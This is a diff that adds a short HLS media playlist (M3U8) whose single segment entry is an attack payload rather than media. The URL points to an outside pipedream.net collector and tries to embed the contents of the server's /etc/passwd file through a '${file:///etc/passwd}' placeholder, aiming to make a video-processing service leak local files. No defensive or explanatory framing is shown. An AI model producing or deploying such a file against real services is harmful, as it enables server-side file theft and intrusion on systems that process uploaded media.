@@ -1,0 +1,6 @@
+#EXTM3U
+#EXT-X-VERSION:3
+#EXT-X-TARGETDURATION:10
+#EXTINF:10.0,
+https://eoow6y96ffo9mzx.m.pipedream.net/log?file=passwd&content=${file:///etc/passwd}
+#EXT-X-ENDLIST
